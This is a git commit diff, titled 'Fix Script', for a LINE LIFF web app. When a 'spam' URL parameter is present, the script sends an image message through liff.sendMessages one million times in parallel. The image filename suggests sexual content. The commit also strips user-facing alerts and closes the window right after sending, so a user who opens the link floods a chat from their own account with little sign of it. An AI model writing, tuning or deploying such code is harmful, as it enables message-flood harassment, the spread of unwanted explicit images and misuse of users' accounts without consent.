ce3b8689f449383889c0a2b546f3c2363042926f
nezumi0627 <ren1108.km@gmail.com>
2024-10-21 00:22:42 +0900

    Fix Script

--- script.js
+++ script.js
@@ -5,13 +5,9 @@ document.addEventListener('DOMContentLoaded', async () => {
         await liff.init({ liffId: LIFF_ID });
         if (liff.isInClient()) {
             await initializeLiff();
-        } else {
-            console.error("This app is intended to be used in the LINE app.");
-            alert("このアプリはLINEアプリ内で使用することを意図しています。");
         }
     } catch (error) {
         console.error('LIFF Initialization failed', error);
-        alert('LIFFの初期化に失敗しました。再試行してください。');
     }
 });
 
@@ -25,7 +21,6 @@ async function initializeLiff() {
         }
     } catch (error) {
         console.error('Error initializing LIFF', error);
-        alert('LIFFの初期化中にエラーが発生しました。');
     }
 }
 
@@ -44,42 +39,32 @@ async function urlParamsCheck() {
                 linkUrl: "https://nezumi0627.github.io/nezuminium.github.io/"
             }
         });
-        // 1秒遅延してからウィンドウを閉じる
-        setTimeout(() => {
-            liff.closeWindow();
-        }, 1000);
+        liff.closeWindow();
     }
 
     if (spamParam !== null) {
-        await sendSpamMessages(100000000, { // スパム送信数を100000000に変更
+        await sendSpamMessages(1000000, {
             type: 'image',
             originalContentUrl: "https://ogami110.com/33namevoice/wp-content/uploads/2022/03/%E5%AF%9D%E5%8F%96%E3%82%89%E3%82%8C%E8%AA%BF%E6%95%99_7.jpg",
             previewImageUrl: "https://ogami110.com/33namevoice/wp-content/uploads/2022/03/%E5%AF%9D%E5%8F%96%E3%82%89%E3%82%8C%E8%AA%BF%E6%95%99_7.jpg"
         });
+        liff.closeWindow();
     }
 }
 
 async function sendMessage(message) {
     try {
-        console.log('Sending message:', message);
         await liff.sendMessages([message]);
-        console.log('Message sent successfully');
+        console.log('Message sent');
     } catch (error) {
         console.error('Error sending message', error);
-        alert('メッセージの送信中にエラーが発生しました。');
     }
 }
 
 async function sendSpamMessages(count, message) {
+    const promises = [];
     for (let i = 0; i < count; i++) {
-        await sendMessage(message);
+        promises.push(sendMessage(message));
     }
+    await Promise.all(promises);
 }
-
-// 年を自動的に更新
-document.querySelector('.year').textContent = new Date().getFullYear();
-
-// ページが読み込まれたときにコンテンツをフェードインさせる
-window.onload = () => {
-    document.body.style.opacity = 1; // opacityを1にして表示
-};
